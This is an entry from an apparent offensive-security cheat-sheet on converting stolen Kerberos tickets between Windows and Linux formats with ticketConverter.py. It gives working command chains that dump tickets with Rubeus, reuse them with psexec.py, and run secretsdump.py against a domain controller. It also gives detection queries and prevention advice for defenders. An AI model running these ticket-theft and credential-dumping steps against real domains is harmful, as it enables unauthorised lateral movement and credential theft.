name: ticketConverter.py - Kerberos Ticket Format Conversion
description: Impackets ticketConverter converts Kerberos tickets between formats: kirbi (Windows/Mimikatz/Rubeus format) to ccache (Linux/Impacket format) and vice versa. Essential for cross-platform attack chains where you extract a ticket on Windows and need to use it on Linux, or vice versa.
notes:
=== KIRBI TO CCACHE (Windows -> Linux) ===
  python3 ticketConverter.py admin.kirbi admin.ccache
  export KRB5CCNAME=admin.ccache
  python3 psexec.py -k -no-pass <domain>/administrator@<target>

=== CCACHE TO KIRBI (Linux -> Windows) ===
  python3 ticketConverter.py admin.ccache admin.kirbi
  # Import on Windows with Rubeus:
  Rubeus.exe ptt /ticket:<base64_of_kirbi>

=== COMMON WORKFLOW ===
  # 1. Extract ticket on Windows (Rubeus)
  Rubeus.exe dump /nowrap
  # Save base64 to file, decode:
  base64 -d ticket.b64 > ticket.kirbi

  # 2. Convert to ccache
  python3 ticketConverter.py ticket.kirbi ticket.ccache

  # 3. Use on Linux
  export KRB5CCNAME=ticket.ccache
  python3 secretsdump.py -k -no-pass <dc_fqdn>

=== DECODE BASE64 TICKET ===
  # From Rubeus output (base64 encoded kirbi):
  echo "<base64_ticket>" | base64 -d > ticket.kirbi
  # Then convert:
  python3 ticketConverter.py ticket.kirbi ticket.ccache

examples.label: Full cross-platform workflow
examples.command: echo "<base64_ticket>" | base64 -d > ticket.kirbi && python3 ticketConverter.py ticket.kirbi ticket.ccache && export KRB5CCNAME=ticket.ccache

recommended.note: Rubeus extracts tickets on Windows; ticketConverter moves them to Linux.
Use converted ccache tickets with Impacket tools on Linux.

defense.why_it_works: Kerberos tickets are protocol-level tokens that are valid regardless of the platform they are used from. Converting between formats allows attackers to leverage tickets extracted on one OS from another.
defense.prerequisites: A valid Kerberos ticket in either kirbi or ccache format.
defense.impact: Cross-platform ticket reuse; enables using Windows-extracted tickets from Linux attack tools.
defense.detection: [MITRE T1550.003] Ticket use from unexpected platforms; Kerberos authentication from non-Windows clients for Windows services.
defense.artifacts: Event 4769 (TGS request) from Linux IP addresses; unusual client OS in Kerberos authentication.
defense.splunk_spl:
index=windows EventCode=4769
| where NOT match(IpAddress, "10\.10\.") AND IpAddress!="127.0.0.1"
| table _time, TargetUserName, ServiceName, IpAddress
defense.sentinel_kql:
SecurityEvent
| where EventID == 4769
| project TimeGenerated, TargetUserName, ServiceName, IpAddress, TicketEncryptionType
defense.prevention: Monitor for Kerberos authentication from unexpected source IPs; use Protected Users group; implement PAC validation.
